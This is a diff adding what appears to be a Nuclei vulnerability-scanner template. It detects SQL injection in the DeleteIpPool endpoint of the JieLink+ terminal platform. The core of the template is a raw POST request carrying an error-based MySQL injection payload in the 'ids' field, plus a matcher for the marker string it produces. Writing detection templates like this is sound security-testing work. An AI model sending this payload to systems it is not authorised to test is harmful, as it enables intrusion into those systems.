@@ -1,0 +1,28 @@
+id: JieLink-DeleteIpPool-sqli
+
+info:
+  name: JieLink+智能终端操作平台 DeleteIpPool SQL注入漏洞
+  author: JieLink
+  severity: high
+  tags: JieLink
+
+http:
+  - raw:
+      - |
+        POST /project/IPPool/DeleteIpPool HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+
+        ids=(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b707171,(SELECT (ELT(1617=1617,1))),0x716a7a6271,0x78))s), 8446744073709551610, 8446744073709551610)))
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkpqq1qjzbqx'
+        condition: and
+      - type: status
+        status: 
+          - 200
